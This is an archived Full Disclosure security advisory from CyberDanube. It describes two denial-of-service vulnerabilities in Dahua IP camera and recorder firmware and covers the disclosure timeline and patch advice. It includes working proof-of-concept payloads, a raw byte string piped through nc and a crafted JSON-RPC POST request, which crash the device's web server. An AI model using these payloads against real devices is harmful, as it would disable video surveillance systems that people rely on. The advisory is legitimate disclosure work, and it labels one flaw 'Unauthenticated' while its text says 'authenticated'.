---
title: CyberDanube Security Research 20260611-0 | Multiple Denial of Service Vulnerabilities in Dahua IPC/SD/NVR/XVR/EVS/VTO/VTH/ASI/TPC Camera Series
url: https://seclists.org/fulldisclosure/2026/Aug/120
source: Full Disclosure
date: 2026-08-30
fetch_date: 2026-08-31T07:53:51.118293
---

# CyberDanube Security Research 20260611-0 | Multiple Denial of Service Vulnerabilities in Dahua IPC/SD/NVR/XVR/EVS/VTO/VTH/ASI/TPC Camera Series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](119)
[By Date](date.html#120)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](119)
[By Thread](index.html#120)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20260611-0 | Multiple Denial of Service Vulnerabilities in Dahua IPC/SD/NVR/XVR/EVS/VTO/VTH/ASI/TPC Camera Series

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 27 Aug 2026 12:13:12 +0000

---

```
CyberDanube Security Research 20260611-0
-------------------------------------------------------------------------------
title| Multiple Denial of Service
product| Dahua DH-IPC-HFW Series
vulnerable version| <=V3.142.0000000.8.R.250826
fixed version| Versions build including and after 2026-03-26.
CVE number| CVE-2026-29115, CVE-2026-29116
impact| High
homepage| https://www.dahuasecurity.com/
found| 20.10.2025
by| T. Weber, S. Eisenreich-Dietz
| (Office Vienna)
| CyberDanube Security Research
| Vienna
|
| https://www.cyberdanube.com
-------------------------------------------------------------------------------
Vendor description
-------------------------------------------------------------------------------
"Dahua Technology is a world-leading video-centric AIoT solution and service
provider. Committed to enabling a smarter society and better living, Dahua
actively implements its Dahua Think#2.0 strategy, evolving from “Intelligence”
to “Integrated Intelligence” to drive digital innovation and transformation for
cities and enterprises. The company supports urban development by enhancing
management efficiency, enabling autonomous city operations, upgrading public
safety systems, and advancing ecological governance. In the enterprise sector,
Dahua focuses on strengthening security systems, increasing operational
productivity, and enabling data-driven decision-making to help businesses
thrive."
Source: https://www.dahuasecurity.com/aboutUs/introduction/0
Vulnerable versions
-------------------------------------------------------------------------------
DH_IPC-HX5XXX-single-Riemann_MultiLang_PN_Stream4_V3.142.0000000.8.R.250826
We know that more firmware versions are prone to this DoS vulnerabilities, but
we cannot determine all exact versions. Other cameras from Dahua seems to not
have a watchdog. Therefore, they do not trigger an automatic reboot and stay in
a temporary bricked state.
According to the vendor, the following series are affected:
"Part of IPC、SD、NVR、XVR、EVS、VTO、VTH、ASI、TPC"
See:
https://www.dahuasecurity.com/about-dahua/trust-center/dahua-psirt/dhcc-sa-202606-001:-security-advisory-%E2%80%93-vulnerabilities-found-in-some-dahua-products
https://materialfile.dahuasecurity.com/new_uploads_formal/soft/20260609/Affected_Models.pdf

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Denial-of-Service (CVE-2026-29115)
A temporary DoS (Denial of Service) condition can be triggered on the device.
This leads to a reboot of the full system, which affects its availability.
2) Unauthenticated Denial-of-Service (CVE-2026-29116)
A Denial of Service condition can be triggered on the device, which is
temporary on newer camera series but can also be persisten on older Dahua
devices. This is due to the usage of a watchdog in the newer camera firmware.
Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Denial-of-Service (CVE-2026-29115)
The following command can be used to force the denial of service state:
$ echo -ne
"\x20\x00\x00\x00\x44\x48\x49\x50\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x00\x00\x00\x00\x00\x00\x00\x49\x00\x00\x00\x00\x00\x00\x00\x49\x00\x00\x00\x00\x00\x00\x00\x7b\x20\x0a"
 | nc 192.168.19.136 80
The address 192.168.19.136 was used in this example as camera IP. After
executing, the web server crashes and the device triggers a reboot. This takes
a few minutes, resulting in black screens on the video surveillance systems on
the windows clients for that time.
2) Unauthenticated Denial-of-Service (CVE-2026-29116)
An authenticated attacker can crash the webserver with a crafted request under
the condition, that an SD card is inserted. If both pre-conditions are met, the
following POST request can be used to kill the web server:
-----------------------------------------------------
POST /RPC2 HTTP/1.1
Host: 192.168.19.136
Content-Length: 139
Accept-Language: de-DE,de;q=0.9
Accept: application/json, text/plain, /
Content-Type: application/json
Origin: http://192.168.19.136
Referer: http://192.168.19.136/
Accept-Encoding: gzip, deflate, br
Cookie: WebClientHttpSessionID=<Session-ID>
Connection: keep-alive
{"method":"workDirectory.factory.instance","params":{"name":"/mnt/dvr/mmc2p2_0aaaa"},"id":213,"session":"<Session-ID>"}
-----------------------------------------------------
The address 192.168.19.136 was used in this example as camera IP. After
executing, the web server crashes and the device triggers a reboot. This takes
a few minutes, resulting in black screens on the video surveillance systems on
the windows clients for that time.
Solution
-------------------------------------------------------------------------------
Install patches immediately.

Workaround
-------------------------------------------------------------------------------
Restrict network access to the device in the infrastructure. Do not expose the
web interface to the Internet or in public networks.

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends to perform a white-box security assessment of the Dahua
DH-IPC-HFWXXXX devices.

Contact Timeline
-------------------------------------------------------------------------------
2025-12-18: Contacting Dahua PSIRT via cybersecurity () dahuatech com and sending
advisory; No answer.
2026-02-04: Asking for a timeline; No answer.
2026-02-24: Asking for a timeline; No answer.
2026-03-05: Asking for a timeline and including psirt () dahuatech com. PSIRT
apologizes for inconvenience. The email was suspected to be
filtered.
2026-03-09: Exchanging PGP keys, trying to communicate back an forth. PSIRT
did not received some emails from CyberDanube that were sent.
2026-03-12: Re-sending advisory. PSIRT did not receive it.
2026-03-16: Re-sending advisory. Confirmation from PSIRT.
2026-03-17: PSIRT confirms the vulnerabilities and asked for shifting the
disclosure date back by 90 days. Agreed due to the criticality of
the finding and the mass-usage of this products.
2026-03-20/23/27: Ongoing communication in both directions.
2026-06-04: Asked for the exact disclosure date for the Dahua announcement.
PSIRT responded that it will go public 2026-06-10.
2026-06-11: Coordinated disclosure of vulnerabilities.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com
EOF T. Weber / @2026
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](119)
[By Date](date.html#120)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](119)
[By Thread](index.html#120)
![Next](/images/right-icon-16x16.png)

### Current thread:

* **CyberD...